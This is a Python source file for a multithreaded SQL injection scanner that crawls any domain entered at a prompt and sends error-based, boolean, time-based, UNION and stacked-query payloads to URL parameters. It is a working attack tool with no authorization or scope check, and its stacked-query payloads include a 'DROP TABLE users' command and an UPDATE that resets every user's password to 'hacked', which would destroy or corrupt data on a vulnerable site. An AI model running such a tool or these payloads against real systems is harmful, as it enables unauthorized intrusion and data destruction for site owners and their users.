from bs4 import XMLParsedAsHTMLWarning
import warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import threading
import time
import re

# --- CONFIGURABLE PARAMETERS ---
MAX_CRAWL_DEPTH = 2    # Limit how deep the crawler goes
MAX_URLS = 100         # Limit total number of URLs to crawl

SQL_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax error",
    "mysql_fetch_array()",
    "syntax error",
    "mysql_num_rows()",
    "mysql_query()",
    "pg_query()",
    "supplied argument is not a valid mysql result resource",
    "mysql_numrows()",
    "mysql_fetch_assoc()",
    "mysql_fetch_row()",
    "mysql_result()",
    "odbc_exec()",
    "sqlsrv_query()",
    "incorrect syntax near",
    "sqlite3.OperationalError",
    "SQLSTATE",
    "mysql error",
    "native client",
    "syntax error",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; SQLiScanner/2.0; +https://example.com/bot)"
}

ERROR_BASED_PAYLOADS = [
    "'", "\"", "')", "\")", "'--", "\"--", "')--", "\")--",
    "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR 1=1--", "\" OR 1=1--",
    "' OR '1'='1' -- ", "\" OR \"1\"=\"1\" -- ",
]

BOOLEAN_BASED_PAYLOADS = [
    "' AND 1=1 -- ", "' AND 1=2 -- ",
    "\" AND 1=1 -- ", "\" AND 1=2 -- ",
    "') AND 1=1 -- ", "') AND 1=2 -- ",
]

TIME_BASED_PAYLOADS = {
    "mssql": "'; WAITFOR DELAY '0:0:5'--",
    "mysql": "' AND SLEEP(5)--",
    "postgresql": "'; SELECT pg_sleep(5)--",
    "oracle": "'; dbms_pipe.receive_message('a',5)--",
}

UNION_BASED_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
]

STACKED_QUERIES_PAYLOADS = [
    "'; DROP TABLE users;--",
    "'; UPDATE users SET password='hacked' WHERE '1'='1';--",
]

class SQLiScanner:
    def __init__(self, domain):
        self.domain = domain if domain.startswith("http") else "http://" + domain
        self.visited = set()
        self.vulnerable_urls = {}
        self.lock = threading.Lock()
        self.crawled_count = 0

    def crawl(self, url, depth=0):
        """Recursively crawl the domain to find URLs with parameters, with depth limit."""
        if depth > MAX_CRAWL_DEPTH or self.crawled_count >= MAX_URLS:
            return
        try:
            if url in self.visited:
                return
            self.visited.add(url)
            self.crawled_count += 1
            print(f"[Crawl][{self.crawled_count}] Depth {depth}: {url}")
            resp = requests.get(url, headers=HEADERS, timeout=10)
            if resp.status_code != 200:
                return
            soup = BeautifulSoup(resp.text, "html.parser")

            # Find all links
            for link in soup.find_all("a", href=True):
                href = link.get("href")
                if href.startswith("javascript:") or href.startswith("#"):
                    continue
                full_url = urljoin(url, href)
                if self.domain in full_url and full_url not in self.visited:
                    self.crawl(full_url, depth + 1)

            # Check forms for injectable parameters
            for form in soup.find_all("form"):
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                params = {}
                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue
                    params[name] = "test"
                if action:
                    form_url = urljoin(url, action)
                    if self.domain in form_url:
                        param_str = urlencode(params)
                        test_url = form_url
                        if method == "get":
                            if "?" in form_url:
                                test_url += "&" + param_str
                            else:
                                test_url += "?" + param_str
                        self.visited.add(test_url)
                        print(f"[Crawl][Form] Found form URL: {test_url}")

        except Exception as e:
            print(f"[Crawl][Error] {url}: {e}")

    def send_request(self, url):
        try:
            print(f"[Request] {url}")
            resp = requests.get(url, headers=HEADERS, timeout=10)
            if resp.status_code == 200:
                return resp.text.lower()
            return None
        except Exception as e:
            print(f"[Request][Error] {url}: {e}")
            return None

    def detect_error_based_sqli(self, url, param):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query.get(param, [""])[0]

        for payload in ERROR_BASED_PAYLOADS:
            query[param] = original_value + payload
            new_query = urlencode(query, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            content = self.send_request(test_url)
            if content:
                for error in SQL_ERRORS:
                    if error in content:
                        print(f"[VULN][Error-based] {test_url} | Param: {param} | Payload: {payload}")
                        return f"Error-based SQLi detected with payload: {payload}"
        return None

    def detect_boolean_based_sqli(self, url, param):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query.get(param, [""])[0]

        # True condition
        query[param] = original_value + "' AND 1=1 -- "
        true_query = urlencode(query, doseq=True)
        true_url = parsed._replace(query=true_query).geturl()
        true_resp = self.send_request(true_url)

        # False condition
        query[param] = original_value + "' AND 1=2 -- "
        false_query = urlencode(query, doseq=True)
        false_url = parsed._replace(query=false_query).geturl()
        false_resp = self.send_request(false_url)

        if true_resp and false_resp and true_resp != false_resp:
            print(f"[VULN][Boolean-based] {url} | Param: {param}")
            return "Boolean-based blind SQLi detected"
        return None

    def detect_time_based_sqli(self, url, param):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query.get(param, [""])[0]

        for dbms, payload in TIME_BASED_PAYLOADS.items():
            query[param] = original_value + payload
            new_query = urlencode(query, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            try:
                print(f"[Time-based][Test] {test_url}")
                start = time.time()
                resp = requests.get(test_url, headers=HEADERS, timeout=15)
                end = time.time()
                if end - start > 4:
                    print(f"[VULN][Time-based] {test_url} | Param: {param} | DBMS: {dbms}")
                    return f"Time-based blind SQLi detected (DBMS: {dbms})"
            except Exception as e:
                print(f"[Time-based][Error] {test_url}: {e}")
                continue
        return None

    def detect_union_based_sqli(self, url, param):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query.get(param, [""])[0]

        for payload in UNION_BASED_PAYLOADS:
            query[param] = original_value + payload
            new_query = urlencode(query, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            content = self.send_request(test_url)
            if content:
                if "union" in content or "<table" in content or "select" in content:
                    print(f"[VULN][Union-based] {test_url} | Param: {param} | Payload: {payload}")
                    return f"Union-based SQLi suspected with payload: {payload}"
        return None

    def detect_stacked_queries_sqli(self, url, param):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query.get(param, [""])[0]

        for payload in STACKED_QUERIES_PAYLOADS:
            query[param] = original_value + payload
            new_query = urlencode(query, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            content = self.send_request(test_url)
            if content:
                for error in SQL_ERRORS:
                    if error in content:
                        print(f"[VULN][Stacked] {test_url} | Param: {param} | Payload: {payload}")
                        return f"Stacked queries SQLi detected with payload: {payload}"
        return None

    def scan_url(self, url):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        if not query:
            return
        for param in query.keys():
            result = self.detect_error_based_sqli(url, param)
            if result:
                with self.lock:
                    self.vulnerable_urls[url] = f"Parameter '{param}': {result}"
                return

            result = self.detect_boolean_based_sqli(url, param)
            if result:
                with self.lock:
                    self.vulnerable_urls[url] = f"Parameter '{param}': {result}"
                return

            result = self.detect_time_based_sqli(url, param)
            if result:
                with self.lock:
                    self.vulnerable_urls[url] = f"Parameter '{param}': {result}"
                return

            result = self.detect_union_based_sqli(url, param)
            if result:
                with self.lock:
                    self.vulnerable_urls[url] = f"Parameter '{param}': {result}"
                return

            result = self.detect_stacked_queries_sqli(url, param)
            if result:
                with self.lock:
                    self.vulnerable_urls[url] = f"Parameter '{param}': {result}"
                return

    def run(self):
        print(f"[+] Starting crawl on domain: {self.domain}")
        self.crawl(self.domain)
        print(f"[+] Crawling finished. {len(self.visited)} URLs found.")
        print("[+] Starting SQL Injection tests on URLs with parameters...")

        threads = []
        for url in self.visited:
            if "?" in url:
                t = threading.Thread(target=self.scan_url, args=(url,))
                t.start()
                threads.append(t)
        for t in threads:
            t.join()

        print("[+] Scan completed.")
        if self.vulnerable_urls:
            print("[+] Vulnerable URLs found:")
            for url, info in self.vulnerable_urls.items():
                print(f" - {url} : {info}")
        else:
            print("[-] No SQL Injection vulnerabilities detected.")

        with open("sqli_report.txt", "w") as f:
            f.write(f"SQL Injection Scan Report for {self.domain}\n")
            f.write("=" * 50 + "\n")
            if self.vulnerable_urls:
                for url, info in self.vulnerable_urls.items():
                    f.write(f"{url} : {info}\n")
            else:
                f.write("No SQL Injection vulnerabilities detected.\n")
        print("[+] Report saved to sqli_report.txt")

if __name__ == "__main__":
    domain = input("Enter the domain to scan (e.g. http://example.com): ").strip()
    scanner = SQLiScanner(domain)
    scanner.run()
